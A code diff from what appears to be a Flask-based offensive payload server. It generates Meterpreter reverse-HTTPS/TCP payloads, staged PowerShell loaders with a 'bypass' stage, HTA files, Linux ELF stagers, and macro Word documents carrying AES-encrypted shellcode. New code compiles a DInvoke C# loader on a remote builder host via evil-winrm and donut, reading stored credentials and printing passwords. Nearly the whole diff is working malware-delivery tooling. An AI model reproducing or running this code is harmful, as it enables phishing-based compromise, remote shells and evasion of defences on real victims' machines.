@@ -637,9 +637,9 @@ def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
 
 
 def ps(id, stage, proxy=False):
-    clean_id = filter_string(id)
+    id = filter_string(id)
 
-    if clean_id == "":
+    if id == "":
         return "Invalid id", 400
 
     if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
@@ -654,17 +654,17 @@ def ps(id, stage, proxy=False):
         payload_type = "ps"
 
     if stage == 'bypass':
-        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)
+        return render_template_string(WIN_BYPASS_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)
 
     if stage == 'loader_32':
-        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)
+        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)
 
     if stage == 'start':
-        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type=payload_type, proxy=proxy)
+        return render_template_string(WIN_START_TEMPLATE, host=host, id=id, type=payload_type, proxy=proxy)
 
     if stage == 'delegate':
         payloads_generated = gen_multiple_payloads(
-            lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[64]
+            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[64]
         )
         payload_x64 = encrypt_ps_payload(payloads_generated[64])
         return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=payload_x64)
@@ -708,9 +708,9 @@ def ps_get_command():
 
 @win.route('/tcp/<id>/<stage>')
 def tcp(id, stage):
-    clean_id = filter_int(id)
+    id = filter_int(id)
 
-    if clean_id == "":
+    if id == "":
         return "Invalid id", 400
 
     if stage != 'delegate' and stage != 'start' and stage != 'loader_32' and stage != 'bypass':
@@ -723,22 +723,22 @@ def tcp(id, stage):
         return render_template_string(WIN_BYPASS_TEMPLATE, host=host)
 
     if stage == 'loader_32':
-        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=clean_id, type='tcp')
+        return render_template_string(WIN_LOADER_32_TEMPLATE, host=host, id=id, type='tcp')
 
     if stage == 'start':
-        return render_template_string(WIN_START_TEMPLATE, host=host, id=clean_id, type='tcp')
+        return render_template_string(WIN_START_TEMPLATE, host=host, id=id, type='tcp')
 
     if stage == 'delegate':
         setup_listener(
             lhost,
-            clean_id,
+            id,
             LISTENER_CONFIGS["PS_TCP"]
         )
 
         raw_payload_file = generate_payload(
             LISTENER_CONFIGS["PS_TCP"]["Payload"],
             lhost,
-            clean_id,
+            id,
             'raw',
             [
 
@@ -861,6 +861,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     )
 
     b64_pass = base64.b64encode(password.encode())
+    print(f"patch_document{b64_pass =}\n{b64_payload = }")
 
     pwd_start_idx = patched.find(PWD_START)
     if pwd_start_idx == -1:
@@ -899,12 +900,12 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
     """
     Genereer AES-versleutelde payload (Base64) op basis van ID, arch, host, etc.
     """
-    clean_id = filter_string(id)
-    if clean_id == "":
+    id = filter_string(id)
+    if id == "":
         raise ValueError("Invalid id")
 
     payloads = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config=payload_type, endpoint="ms", archs=[arch]
+        lhost, lport, proxy, id, config=payload_type, endpoint="ms", archs=[arch]
     )
 
     raw_bytes = payloads[arch]
@@ -918,28 +919,119 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
 def generate_encrypted_payloads(id: str, lhost: str, lport: int, password: str, archs: list = [32, 64], proxy: bool = False, payload_type: str = "windows_meterpreter_reverse_winhttps") -> dict:
     retval = {}
     for i in archs:
-        retval[i] = openssl_pbkdf2_encrypt(generate_encrypted_payload(
-            id, lhost, lport, password, archs=int(i), proxy=proxy, payload_type=payload_type))
+        retval[i] = generate_encrypted_payload(
+            id, lhost, lport, password, arch=int(i), proxy=proxy, payload_type=payload_type)
     return retval
+
+def generate_dinvoke_x64_x86(input_data: Dict) -> Optional[BytesIO]:
+    retval = {}
+
+    path_winrm_commands = "/tmp/winrm-commands.txt"
+    path_template_cs_dinvoke = "/mnt/exploits/DInvoke/setup/stage-12.cs"
+    payload_output_path = f"{PAYLOAD_DIR}/stage-12.cs"
+    winrm_builder_host = "10.1.1.51"
+
+    # Read builder credentials
+    with open("CREDS_WINRM_BUILDER.txt", "r") as f:
+        username, password = map(str.strip, f.read().split(":", 1))
+
+    # Validate required keys
+    required_keys = [32, 64, 'ps', 'password']
+    missing_keys = [k for k in required_keys if k not in input_data]
+    if missing_keys:
+        raise ValueError(f"input_data is missing required keys: {missing_keys}")
+
+
+
+    # with open(f"{PAYLOAD_DIR}/{input_data[32]}", 'rb') as f:
+    #     p_32 = f.read()
+    # with open(f"{PAYLOAD_DIR}/{input_data[64]}", 'rb') as f:
+    #     p_64 = f.read()
+    print(f"{input_data = }")
+    # exit()
+    replacements = {
+        'REPLACE_WITH_MSFVENOM_PASSWORD': input_data['password'],
+        'REPLACE_WITH_x86_MSFVENOM_OUTPUT': input_data[32].decode('latin-1'),
+        'REPLACE_WITH_x64_MSFVENOM_OUTPUT': input_data[64].decode('latin-1'),
+        'REPLACE_WITH_POWERSHELL_PAYLOAD': input_data['ps'],
+    }
+
+    # Load and patch payload
+    with open(path_template_cs_dinvoke, "r") as f:
+        payload = f.read()
+
+
+    for placeholder, replacement in replacements.items():
+        payload = payload.replace(placeholder, replacement)
+
+    # Write patched payload
+    with open(payload_output_path, "w") as f:
+        f.write(payload)
+
+    # Prepare WinRM commands
+    winrm_command = rf"""del .\stage-12.cs
+del .\exploit-program.exe
+upload {payload_output_path}
+$dinvokePath = "C:\Tools\NuGetPkgs\DInvoke.1.0.4\lib\net35\DInvoke.dll"
+$sma = [System.Management.Automation.PowerShell].Assembly.Location
+& C:\Windows\Microsoft.NET\Framework\v4.0.*\csc.exe /resource:"$dinvokePath",DInvoke.dll /reference:"$sma" /target:exe /platform:anycpu /out:exploit-program.exe .\stage-12.cs /optimize+ /d:TRACE /filealign:512
+cd donut*
+.\donut.exe ..\exploit-program.exe -o ..\loader.bin
+cd ..
+download ./exploit-program.exe /tmp/loader.exe
+download ./exploit-program.bin /tmp/loader.bin
+exit"""
+
+    print(winrm_command)
+
+    # Write command file
+    with open(path_winrm_commands, "w") as f:
+        f.write(winrm_command)
+
+    # Run evil-winrm session
+    os.system(f'cat {path_winrm_commands} | evil-winrm -i {winrm_builder_host} -u {username} -p {password}')
+
+    # Optional: check output binary type
+    with os.popen('file /tmp/loader.exe') as f:
+        print(f.read())
+
+    with open('/tmp/loader.bin', 'rb') as f:
+        return f.read()
+
+
 
 
 def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vba: bool = False) -> Optional[BytesIO]:
-    """
-    Patch a Word document using AES encryption. The first entry in `encrypted_payloads` must be a bytes blob or filename.
-    """
     from tempfile import NamedTemporaryFile
     import uuid
-    payloads = gen_multiple_payloads(
-        lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
-    )
-    payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
-    with open(payload_path_32, "rb") as f:
-        payload_bytes_32 = f.read()
-    payload_path_64 = f"{PAYLOAD_DIR}/{payloads[64]}"
-    with open(payload_path_64, "rb") as f:
-        payload_path_64 = f.read()
-
-    payload_entry = encrypted_payloads[0]
+    
+    if proxy:
+        ps_type = "ps_proxy"
+    else:
+        ps_type = "ps"
+    command_text = render_template_string(
+        WIN_PS_COMMAND,
+        lhost=lhost,
+        lport=lport,
+        id=id,
+        type=ps_type,
+        proxy=proxy
+    ).strip()
+    password = str(uuid.uuid4()).replace('-', '')
+    encoded_powershell_command = encode_ps(command_text)
+    payloads = generate_encrypted_payloads(
+                id=id,
+                lhost=lhost,
+                lport=int(lport),
+                password=password,
+                archs=[32, 64],
+                proxy=proxy
+            )
+    print(f"{payloads =}")
+    payloads['ps'] = encoded_powershell_command
+    payloads['password'] = password
+    
+    payload_entry = generate_dinvoke_x64_x86(payloads)
 
     if isinstance(payload_entry, str):
         with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
@@ -949,7 +1041,7 @@ def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vb
     else:
         raise ValueError("Unsupported shellcode payload type")
 
-    password = str(uuid.uuid4()).replace('-', '')
+    # password = str(uuid.uuid4()).replace('-', '')
 
     with NamedTemporaryFile(delete=False) as shellcode_file:
         shellcode_path = pathlib.Path(shellcode_file.name)
@@ -958,6 +1050,8 @@ def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vb
     doc_path = pathlib.Path(template_path)
     with NamedTemporaryFile(delete=False) as output_file:
         output_path = pathlib.Path(output_file.name)
+    
+    shellcode_path = pathlib.Path("/mnt/exploits/DInvoke/bin/loader-eth0-80-stager-vba-eth0-4f02037210b546e096513f690b24974f.bin")
 
     patch_document(doc_path, shellcode_path, output_path, password)
 
@@ -974,10 +1068,10 @@ def word_get():
     proxy = ('system_proxy' in request.form.keys())
     lhost = request.form['lhost']
     lport = int(request.form['lport'])
-    id = request.form['id']
-    clean_id = filter_string(id)
+    id = filter_string(request.form['id'])
 
-    if clean_id == "":
+
+    if id == "":
         return "Invalid id", 400
 
     if payload_type == "vba_shellcode":
@@ -1018,14 +1112,13 @@ def hta_get():
     lhost = request.form['lhost']
     lport = int(request.form['lport'])
     proxy = ('system_proxy' in request.form.keys())
-    id = request.form['id']
-    clean_id = filter_string(id)
-
-    if clean_id == "":
+    id = filter_string(request.form['id'])
+    
+    if id == "":
         return "Invalid id", 400
 
     payloads_generated = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
+        lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
     )
 
     payload_x32 = base64.b64encode(
@@ -1048,7 +1141,7 @@ def hta_get():
     return send_file(
         bytes_io,
         as_attachment=False,
-        download_name=f"{clean_id}.hta",
+        download_name=f"{id}.hta".strip(),
         mimetype='application/octet-stream'
     )
 
@@ -1072,12 +1165,12 @@ def lin_form():
     return template
 
 
-def gen_multiple_payloads_linux(lhost, lport, clean_id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64):
+def gen_multiple_payloads_linux(lhost, lport, id, config="linux_meterpreter_reverse_https", endpoint="ms", arch=64):
     setup_listener(
         lhost,
         lport,
         LISTENER_CONFIGS[config][arch] | {
-            "LURI": f"/ms/{clean_id}/"
+            "LURI": f"/ms/{id}/"
         }
     )
 
@@ -1088,16 +1181,16 @@ def gen_multiple_payloads_linux(lhost, lport, clean_id, config="linux_meterprete
         'elf',
         [
             {
-                "LURI": f"/ms/{clean_id}/",
+                "LURI": f"/ms/{id}/",
                 "PrependFork": "true"
             }
         ]
     )
 
 
-def generate_elf_internal(lhost, lport, clean_id):
+def generate_elf_internal(lhost, lport, id):
     payloads_generated = gen_multiple_payloads_linux(
-        lhost, lport, clean_id
+        lhost, lport, id
     )
     return payloads_generated
 
@@ -1106,15 +1199,15 @@ def generate_elf_internal(lhost, lport, clean_id):
 def generate_elf():
     lhost = request.form.get("lhost", "").strip()
     lport = request.form.get("lport", "").strip()
-    clean_id = filter_string(request.form.get("id", "").strip())
+    id = filter_string(request.form.get("id", "").strip())
 
-    if not lhost or not lport or not clean_id:
+    if not lhost or not lport or not id:
         return "Missing parameters", 400
     return send_from_directory(
         directory=PAYLOAD_DIR,
-        path=generate_elf_internal(lhost, lport, clean_id),
+        path=generate_elf_internal(lhost, lport, id),
         as_attachment=True,
-        download_name=f'{clean_id}.elf'
+        download_name=f'{id}.elf'
     )
 
 
@@ -1122,16 +1215,16 @@ def generate_elf():
 def generate_elf_fee():
     lhost = request.form.get("lhost", "").strip()
     lport = request.form.get("lport", "").strip()
-    clean_id = filter_string(request.form.get("id", "").strip())
+    id = filter_string(request.form.get("id", "").strip())
     scripting_language = request.form.get("scripting_language", "").strip()
-    if not lhost or not lport or not clean_id:
+    if not lhost or not lport or not id:
         return "Missing parameters", 400
 
     print(f"{scripting_language=}")
     if scripting_language not in ['pl', 'py', 'rb']:
         return f"{scripting_language not in ['pl', 'py', 'rb'] =}", 400
 
-    bin_loc = generate_elf_internal(lhost, lport, clean_id)
+    bin_loc = generate_elf_internal(lhost, lport, id)
     command = f"fee {PAYLOAD_DIR}/{bin_loc} -l {scripting_language} | tee {PAYLOAD_DIR}/{bin_loc}.{scripting_language}.bin"
     with os.popen(command) as f:
         fee_output = f.read()
@@ -1194,6 +1287,7 @@ def aes_payload():
             proxy=proxy
         )
         return encrypted_blob
+
 
 
 app = Flask(__name__)
